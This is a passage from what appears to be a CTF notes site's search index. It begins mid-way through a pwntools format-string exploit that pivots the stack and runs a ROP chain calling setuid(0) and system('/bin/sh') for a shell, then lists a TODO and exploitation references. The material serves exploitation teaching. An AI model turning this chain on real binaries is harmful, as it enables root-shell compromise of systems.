FmtStrIso(exec_fmt_exit, offset=22, padlen=1, numbwritten=0x5f)  # auto offset+padlen (no-$)\n\nf_exit.write(rbp_leak, bss)\nf_exit.write(rbp_leak+8*1, ret)\nf_exit.write(rbp_leak+8*2, exe.sym.func)\nf_exit.write(rbp_leak+8*3, pop_rsp)\nf_exit.write(rbp_leak+8*4, bss)\n\nf_exit.execute_writes()\n\n#=========================================================#\n#================ setuid and system rop ==================#\n#=========================================================#\n\nrop.call('setuid', [0])\nrop.raw(ret)\nrop.call(libc.sym.system, [binsh])\ncounter = 0\n\nexec_fmt_again(b'A'*16)\n\nfor idx, c in enumerate(rop.build()):\n    f_exit.write(bss+(8*idx), c)\n    counter += 1\n\nf_exit.execute_writes()\n\nio.interactive()\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF","no-dollar-payload"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/13-Format-String-Attack-No-Dollar-Payload/#todo","title":"TODO","text":"<ul> <li> Add already written stable exploit here. </li> <li> Add explanation</li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF","no-dollar-payload"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/13-Format-String-Attack-No-Dollar-Payload/#references","title":"References","text":"<p>Format string exploitation tutorial Format String Exploitation (Shellphish)</p> <p>Pwntools documentation (ROP, fmtstr_payload, primitives) Pwntools Documentation</p> <p>PLT/GOT, relocations, late binding explained Dynamic Linking and the GOT/PLT</p> <p>ret2dlresolve technique (crafting fake reloc/sym/string) ret2dlresolve Technique (Dhaval Kapil)</p> <p>glibc startup internals (leaking __libc_start_main) glibc Internals: __libc_start_main</p> <p>Linux syscall reference (numbers/args) Linux Syscalls Table</p> <p>AMD64 System V ABI (calling convention, alignment) System V AMD64 ABI</p> <p>FSOP / _IO_FILE exploitation overview FSOP (File Structure Oriented Programming)</p> <p>Intel CET overview (IBT/endbr64, SHSTK) Linux Shadow Stack (SHSTK) &amp; IBT</p> <p>Modern heap/exit-hook notes (__exit_funcs, destructors) Heap Exploitation on Modern Linux</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF","no-dollar-payload"]}]}